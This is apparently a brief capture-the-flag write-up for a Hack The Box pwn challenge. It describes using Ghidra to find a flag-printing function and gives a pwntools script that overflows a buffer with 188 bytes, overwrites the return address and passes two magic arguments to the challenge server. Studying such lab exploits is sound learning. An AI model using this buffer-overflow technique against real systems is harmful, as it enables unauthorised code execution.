>> This is the second pwn challenge in hack the box
>> Using ghidra you'll see the function that is printing out the flag should be passed two argurments to it.Which are later compared and if the condition is true the flag is printed .

Here's my script and approach to solving the challenge.

```#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln")
context.update(arch="i386")
p = remote('159.65.53.42', '30458')
#p = elf.process()
payload = b'A'*188
payload += p32(0x80491e2)
payload += b'\x90\x90\x90\x90'
payload += p32(0xdeadbeef)
payload += p32(0xc0ded00d)

print(p.recvline())
p.sendline(payload)
print(p.recvline())
p.interactive()
```
